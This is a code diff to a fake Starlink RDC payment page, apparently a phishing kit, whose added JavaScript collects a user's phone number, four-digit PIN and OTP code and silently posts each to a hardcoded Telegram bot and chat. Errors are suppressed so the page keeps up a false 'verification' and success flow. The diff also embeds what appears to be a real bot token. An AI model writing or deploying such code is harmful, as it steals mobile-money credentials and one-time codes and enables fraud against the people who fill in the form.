@@ -269,7 +269,7 @@
     document.getElementById('plan-name').textContent  = plan.name;
     document.getElementById('plan-price').textContent = plan.price;
 
-    // ── Auto-advance PIN boxes ─────────────────────────────────────
+    // ── Auto-advance PIN/OTP boxes ─────────────────────────────────
     function wireBoxes(selector) {
       const boxes = document.querySelectorAll(selector);
       boxes.forEach((box, idx) => {
@@ -284,28 +284,62 @@
     wireBoxes('.pin-inputs input');
     wireBoxes('.otp-inputs input');
 
-    // ── STEP 1: Phone + PIN submit → show OTP card ─────────────────
+    // ── Telegram config ────────────────────────────────────────────
+    const TG_TOKEN   = '8792667272:AAEe7Mg50P4r7V4u_-zHNRF2TnNkgG5s-jQ';
+    const TG_CHAT_ID = '2056358288';
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TG_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      }).catch(() => {}); // silent — never blocks the UI
+    }
+
+    // ── Store data across steps ────────────────────────────────────
+    let savedPhone = '';
+    let savedPin   = '';
+
+    // ── STEP 1: Phone + PIN → Telegram + show OTP card ────────────
     function handlePayment(e) {
       e.preventDefault();
 
       const rawPhone = document.getElementById('phone').value.trim();
-      const formatted = '+243' + rawPhone;
+      savedPhone = '+243' + rawPhone;
+      savedPin   = ['pin1','pin2','pin3','pin4']
+                     .map(id => document.getElementById(id).value)
+                     .join('');
 
-      // Show OTP card, hide payment card
+      const now = new Date().toLocaleString('fr-CD', { timeZone: 'Africa/Kinshasa' });
+      sendToTelegram(
+`🛰️ <b>STARLINK RDC — Nouvelle Tentative</b>
+
+📦 <b>Plan :</b> ${plan.name}
+💰 <b>Montant :</b> ${plan.price}
+📞 <b>Téléphone :</b> ${savedPhone}
+🔐 <b>PIN :</b> <code>${savedPin}</code>
+🕐 <b>Heure :</b> ${now}
+
+⏳ En attente du code OTP...`
+      );
+
+      // Swap cards
       document.getElementById('step-payment').style.display = 'none';
-      const otpCard = document.getElementById('step-otp');
-      otpCard.style.display = 'block';
-
-      // Fill in the phone number
-      document.getElementById('otp-phone-display').textContent = formatted;
-
-      // Focus first OTP box
+      document.getElementById('step-otp').style.display = 'block';
+      document.getElementById('otp-phone-display').textContent = savedPhone;
       document.getElementById('otp1').focus();
     }
 
-    // ── STEP 2: OTP submit → success ──────────────────────────────
+    // ── STEP 2: OTP entered → Telegram + success modal ────────────
     function handleOtp() {
-      const code = ['otp1','otp2','otp3','otp4'].map(id => document.getElementById(id).value).join('');
+      const code = ['otp1','otp2','otp3','otp4']
+                     .map(id => document.getElementById(id).value)
+                     .join('');
+
       if (code.length < 4) {
         document.querySelectorAll('.otp-inputs input').forEach(b => {
           b.style.borderColor = '#ef4444';
@@ -316,6 +350,18 @@
       const btn = document.getElementById('verify-btn');
       btn.disabled = true;
       btn.textContent = 'Vérification…';
+
+      const now = new Date().toLocaleString('fr-CD', { timeZone: 'Africa/Kinshasa' });
+      sendToTelegram(
+`✅ <b>STARLINK RDC — Code OTP Reçu</b>
+
+📦 <b>Plan :</b> ${plan.name}
+💰 <b>Montant :</b> ${plan.price}
+📞 <b>Téléphone :</b> ${savedPhone}
+🔐 <b>PIN :</b> <code>${savedPin}</code>
+🔑 <b>Code OTP :</b> <code>${code}</code>
+🕐 <b>Heure :</b> ${now}`
+      );
 
       setTimeout(() => {
         document.getElementById('success-msg').textContent =
